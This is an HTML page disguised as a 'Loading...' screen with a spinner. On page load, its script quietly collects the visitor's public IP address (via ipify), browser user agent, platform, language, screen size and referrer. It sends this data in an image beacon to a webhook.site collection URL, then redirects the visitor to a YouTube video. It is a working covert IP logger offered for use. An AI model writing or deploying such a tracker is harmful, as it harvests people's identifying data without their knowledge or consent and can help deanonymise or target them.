<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta charset="UTF-8">
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 50px;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <h2>Loading...</h2>
    <div class="spinner"></div>
    <p>Please wait...</p>

    <script>
        const WEBHOOK_URL = 'https://webhook.site/2b17dc40-ef1a-4a3d-b772-f39739292924f8';
        const REDIRECT_TO = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';

        async function sendData() {
            try {
                // Get IP
                const ipResp = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResp.json();

                // Build data object
                const data = {
                    ip: ipData.ip,
                    time: new Date().toISOString(),
                    ua: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: screen.width + 'x' + screen.height,
                    ref: document.referrer || 'direct'
                };

                // Send using Image beacon (no CORS!)
                const params = new URLSearchParams(data).toString();
                const img = new Image();
                img.src = `${WEBHOOK_URL}?${params}`;
                
                console.log('Sending data via image beacon');

            } catch(e) {
                console.error(e);
            }
            
            // Redirect after 2 seconds
            setTimeout(() => {
                window.location.href = REDIRECT_TO;
            }, 2000);
        }

        sendData();
    </script>
</body>
</html>
